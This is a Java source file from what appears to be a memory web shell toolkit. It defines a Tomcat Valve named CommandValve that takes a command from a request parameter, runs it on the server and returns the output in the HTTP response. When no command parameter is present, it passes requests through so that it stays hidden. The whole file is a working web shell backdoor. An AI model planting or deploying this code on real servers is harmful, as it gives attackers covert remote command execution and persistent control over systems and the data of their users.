package com.reajason.javaweb.memshell.shelltool.command;

import org.apache.catalina.Valve;
import org.apache.catalina.connector.Request;
import org.apache.catalina.connector.Response;

import javax.servlet.ServletException;
import javax.servlet.ServletOutputStream;
import java.io.IOException;
import java.io.InputStream;

/**
 * @author ReaJason
 */
public class CommandValve implements Valve {
    public static String paramName;
    protected Valve next;
    protected boolean asyncSupported;

    public CommandValve() {
    }

    @Override
    public Valve getNext() {
        return this.next;
    }

    @Override
    public void setNext(Valve valve) {
        this.next = valve;
    }

    @Override
    public boolean isAsyncSupported() {
        return this.asyncSupported;
    }

    @Override
    public void backgroundProcess() {
    }

    @Override
    public void invoke(Request request, Response response) throws IOException, ServletException {
        try {
            String cmd = request.getParameter(paramName);
            if (cmd != null) {
                Process exec = Runtime.getRuntime().exec(cmd);
                InputStream inputStream = exec.getInputStream();
                ServletOutputStream outputStream = response.getOutputStream();
                byte[] buf = new byte[8192];
                int length;
                while ((length = inputStream.read(buf)) != -1) {
                    outputStream.write(buf, 0, length);
                }
            } else {
                this.getNext().invoke(request, response);
            }
        } catch (Exception e) {
            this.getNext().invoke(request, response);
        }
    }
}